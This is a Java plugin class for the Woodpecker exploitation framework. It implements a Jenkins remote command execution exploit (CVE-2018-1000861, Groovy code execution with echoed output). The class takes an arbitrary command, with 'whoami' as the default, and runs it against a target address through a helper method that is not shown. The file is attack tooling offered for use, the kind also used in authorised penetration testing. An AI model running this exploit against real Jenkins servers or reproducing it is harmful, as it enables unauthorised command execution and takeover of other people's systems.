package me.gv7.woodpecker.plugin.exploits;

import me.gv7.woodpecker.plugin.*;

import java.util.ArrayList;
import java.util.List;
import java.util.Map;

public class JenkinsGroovyExecuteEchoExploit implements IExploit {
    @Override
    public String getExploitTabCaption() {
        return "Jenkins Jetty9 groovy代码执行回显";
    }

    @Override
    public IArgsUsageBinder getExploitCustomArgs() {
        IArgsUsageBinder binder = JenkinsRCE.pluginHelper.createArgsUsageBinder();

        List<IArgs> args = new ArrayList<>();
        IArgs command  = JenkinsRCE.pluginHelper.createArgs();
        command.setRequired(true);
        command.setName("command");
        command.setDefaultValue("whoami");
        command.setDescription("要执行的命令");
        args.add(command);

        binder.setArgsList(args);
        return binder;
    }

    @Override
    public void doExploit(ITarget target, Map<String, String> customArgs, IResultOutput resultOutput) {
        String address = target.getAddress();
        String command = customArgs.get("command");
        String result = JenkinsCommonsUtils.CVE_2018_1000861Echo(address, command);
        resultOutput.successPrintln("\n"+result);
    }
}
